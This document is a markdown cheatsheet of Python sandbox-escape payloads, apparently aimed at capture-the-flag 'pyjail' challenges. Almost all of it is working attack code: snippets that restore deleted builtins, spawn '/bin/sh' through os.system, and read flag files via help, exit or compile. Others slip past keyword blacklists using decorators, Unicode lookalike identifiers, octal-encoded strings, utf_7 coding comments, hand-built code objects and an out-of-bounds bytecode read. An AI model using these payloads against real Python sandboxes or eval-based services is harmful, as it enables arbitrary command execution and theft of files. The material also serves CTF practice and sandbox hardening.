# Pyjail cheatsheet

## Common payloads

### no builtins, inside an interactive shell/multiple exec

```py
# Thanks @Loldemort
del __builtins__
exec(input())
```


### Restore builtins
```py
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
__build_class__.__self__
__import__.__self__
abs.__self__
aiter.__self__
all.__self__
anext.__self__
any.__self__
ascii.__self__
bin.__self__
breakpoint.__self__
callable.__self__
chr.__self__
compile.__self__
delattr.__self__
dir.__self__
divmod.__self__
eval.__self__
exec.__self__
format.__self__
getattr.__self__
globals.__self__
hasattr.__self__
hash.__self__
hex.__self__
id.__self__
input.__self__
isinstance.__self__
issubclass.__self__
iter.__self__
len.__self__
locals.__self__
max.__self__
min.__self__
next.__self__
oct.__self__
ord.__self__
pow.__self__
print.__self__
repr.__self__
round.__self__
setattr.__self__
sorted.__self__
sum.__self__
vars.__self__

user_defined_function.__builtins__
```

### Spawning a shell

```py
breakpoint()
# import os; os.system("/bin/sh")
```
```py
exec(input())
# import os; os.system("/bin/sh")
```
```py
eval(input())
# __import__("os").system("/bin/sh")
```

### Read a file
```py
help() # then send "print\n:e/flag"
```
```py
# to stderr
exit(set(open("flag")))
exit(*open("flag"))
help(*open("flag")) # this also works with (stdout/stderr) closed 
open(*open("flag"))
compile(".","flag","exec") # flag printed to stderr
ast.parse(".", "flag") # only works if ast is imported
```

```py
# to stdout
help(*open("flag")) # this works like a normal print
set(open("flag")) # only works inside an interactive console
print(*open("flag"))
```

### Deleting a variable

```py
# Using try except:

delete_me = ""
try:
    p
except NameError as delete_me:
    pass
print(delete_me) # error
```
```py
# using del

delete_me = ""
del delete_me
print(delete_me) # error
```

## Bypassing common blacklists
### No function calls

```py
@exec
@input
def a():pass # or class a:pass
```

### No function call and no exec/eval

```py
@print
@set
@open
@input
def a():pass # or class a:pass
```

### No function call, no exec/eval, no \n, no spaces, no tabs
```py
@print\r@set\r@open\r@input\rclass\x0ca:pass
```

### No ASCII letters
```py
# I usually use https://lingojam.com/ItalicTextGenerator

𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() # import os;os.system("/bin/sh")

```

Other unicode bypasses: https://peps.python.org/pep-0672/

### no ASCII letters, no underscores, inside eval
```
_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵())

```

### no ASCII letters, no double underscores, no builtins, inside eval
```py
()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦("\157\163").𝘴𝘺𝘴𝘵𝘦𝘮("\57\142\151\156\57\163\150")
```

### no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)
```py
[𝘺:=()._＿𝘥𝘰𝘤＿_, 𝘢:=y[19],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺[34]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺[56])]
```

### no builtins, no mro, single exec (that 0 remains the same)
**The most stable and POWERFUL payload ever.** This is beautiful!
```py
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
```
### Bypass parsers using comments and encodings
This only works in certain cases:
 - Everything is put into a file and then executed
 - There is something like `exec(data)` where `type(data) == bytes`
```py
# -*- coding: utf_7 -*-
def f(x):
    return x
    #+AAo-print(open("flag.txt").read())
# Thanks @collodel
```

### multiple exec, no dots, no builtins/builtins blacklisted  + other blacklisted words 
```py
# only works if sys is already imported
__builtins__ = sys
__builtins__ = modules
__builtins__ = os
system("cat /flag")
```

### builtins are deleted from everywhere:
https://gist.github.com/CharlesAverill/e7fef5a6e078f14b7ac7b3d318e3e24f?permalink_comment_id=4749794#gistcomment-4749794

### Bypass blacklists building functions from scratch
```py
# The number of arguments may change based on the Python version
(lambda x:0).__class__((lambda x:0).__code__.__class__(0, 0, 0, 3, 64, 10, b't\x00d\x01\x83\x01S\x00', (None, 'Your Code Goes Here'), ('exe''c',), ('',), '', '', 1, b'', (), ()), (lambda x:0).__globals__)()
```

You can also use generators or async functions.

### Bypass blacklists using generators

```py
# Way better than (lambda x:x).__globals__
(x for x in ()).gi_frame.f_builtins
(x for x in ()).gi_frame.f_globals
```

### Bypass blacklists using asynchronous functions
```py
async def a():pass
a().cr_frame.f_globals
```

### OOB Read using LOAD_FAST
```py
# Thanks to @splitline, https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc

# This is just an example
(lambda x:x).__class__((lambda a,b,c: [a,b,c]).__code__.replace(co_code=b'\x97\x00|\x11|\x11|\x40g\x03S\x00', co_argcount=0, co_nlocals=0, co_varnames=()), {})()[-1].__globals__["sys"].modules["os"].system("ls")
```
